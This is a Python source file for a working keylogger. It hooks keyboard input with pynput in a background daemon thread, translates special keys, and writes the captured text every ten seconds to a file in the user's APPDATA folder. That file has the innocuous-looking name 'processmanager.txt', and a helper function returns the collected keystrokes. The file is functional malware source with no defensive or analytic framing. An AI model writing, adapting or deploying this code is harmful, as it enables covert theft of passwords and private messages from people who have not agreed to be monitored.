#!/usr/bin/env python
# -*- coding: utf-8 -*-
import threading
import os

try:
    import pynput.keyboard
except ImportError:
    pynput = None

keys = ""
appdata_dir = os.environ.get("APPDATA") or os.environ.get("appdata") or os.path.expanduser("~")
path = os.path.join(appdata_dir, "processmanager.txt")
_listener = None


def process_keys(key):
    """Process and store keystrokes"""
    global keys
    try:
        keys = keys + str(key.char)
    except AttributeError:
        if key == key.space:
            keys = keys + " "
        elif key == key.enter:
            keys = keys + "\n"
        elif key == key.right:
            keys = keys + " [RIGHT] "
        elif key == key.left:
            keys = keys + " [LEFT] "
        elif key == key.up:
            keys = keys + " [UP] "
        elif key == key.down:
            keys = keys + " [DOWN] "
        else:
            keys = keys + " " + str(key) + " "


def report():
    """Write logged keys to file every 10 seconds"""
    global keys, path
    if keys:
        try:
            with open(path, "a", encoding="utf-8") as fin:
                fin.write(keys)
            keys = ""
        except Exception as e:
            pass
    timer = threading.Timer(10, report)
    timer.daemon = True
    timer.start()


def get_logged_keys() -> str:
    """Retrieve logged keystrokes from file and current buffer."""
    global keys, path
    buffered = keys
    history = ""
    if os.path.exists(path):
        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as fin:
                history = fin.read()
        except Exception:
            pass
    combined = (history + buffered).strip()
    return combined if combined else "NO_KEYS_RECORDED"


def start():
    """Start the keylogger in background thread"""
    global _listener
    if pynput is None:
        print("[!] pynput library not installed. Keystroke logging disabled.")
        return
    if _listener is None:
        _listener = pynput.keyboard.Listener(on_press=process_keys)
        _listener.daemon = True
        _listener.start()
        report()


